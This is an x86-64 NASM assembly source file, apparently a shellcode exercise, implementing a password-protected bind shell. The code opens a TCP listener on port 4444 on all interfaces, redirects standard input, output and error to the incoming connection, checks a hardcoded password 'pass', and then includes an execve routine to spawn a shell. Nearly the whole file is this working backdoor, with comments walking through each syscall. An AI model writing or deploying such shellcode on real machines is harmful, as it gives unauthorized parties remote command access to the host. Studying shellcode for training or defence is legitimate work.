global _start

%define _START
_start:
    jmp real_start
    password: db "pass"
    pass_len: db $-password

real_start:
socket:
    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; __NR_socket = 41
    ; On success, a file descriptor for the new socket is returned

    push 41
    pop rax
    push 2
    pop rdi
    push 1
    pop rsi
    cdq       ; copies rax's bit 31 to all bits of edx (zeroes rdx)
    syscall

    push rax
    pop rdi

bind:
    ; server.sin_family = AF_INET;    short
    ; server.sin_port = htons(4444);    unsigned short
    ; server.sin_addr.s_addr = INADDR_ANY;    unsigned long
    ; bzero(&server.sin_zero, 8);
    ;
    ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
    ; struct sockaddr_in {
    ;     short            sin_family;
    ;     unsigned short   sin_port;
    ;     struct in_addr   sin_addr;
    ;     char             sin_zero[8];
    ; };
    ;
    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    ; INADDR_ANY = 0
    ; AF_INET = 2
    ; __NR_bind = 49
    ; On  success,  zero is returned

    xor eax, eax  ; shorter and will still zero the upper bytes
    push rax      ; sin_zero
    push ax
    push ax       ; sin_addr
    push word 0x5c11  ; htons(4444)
    push word 2

    ; bind
    add al, 49
    push rsp
    pop rsi
    add dl, 16    ; sizeof(sockaddr_in)
    syscall

listen:
    ; listen(sock, 2)
    ; __NR_listen = 50
    ; On success, zero is returned

    mov al, 50
    xor esi, esi
    mov sil, 2
    syscall

accept:
    ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
    ; __NR_accept = 43
    ; On success, a file descriptor is returned

    mov al, 43
    xor esi, esi
    ;xor rdx, rdx  ; already zeroed
    syscall
    
    push rax

;close:
    ; close(sock)
    ; __NR_close = 3
    ; returns zero on success

    ; closing is not strictly necessary
    ;mov al, 3
    ;syscall

dup2:
    ; dup2(new, 0);
    ; dup2(new, 1);
    ; dup2(new, 2);
    ; __NR_dup2 = 33
    ; On success, return the new file descriptor

    pop rdi        ; "new" was pushed in accept()
    push 2
    pop rsi

dup2_loop:
    mov al, 33
    syscall
    dec esi
    jns dup2_loop

read_password:
    ; read(int fd, void *buf, size_t count)
    ; On success, the number of bytes read is returned

    ;xor eax, eax  ; already done by dup2
    ;rdi = "new"   ; already done in dup2
    push rax
    push rax       ; create space for "buf" in the stack
    push rsp
    pop rsi        ; rsi = *buf
    mov dl, 16
    syscall

compare_password:
    xor ecx, ecx
    mov cl, [rel pass_len]
    lea rdi, [rel password]
    cld
    repz cmpsb
    jne exit

execve:
    %include "execve-stack.nasm"

exit:
    xor eax, eax
    mov al, 60
    syscall
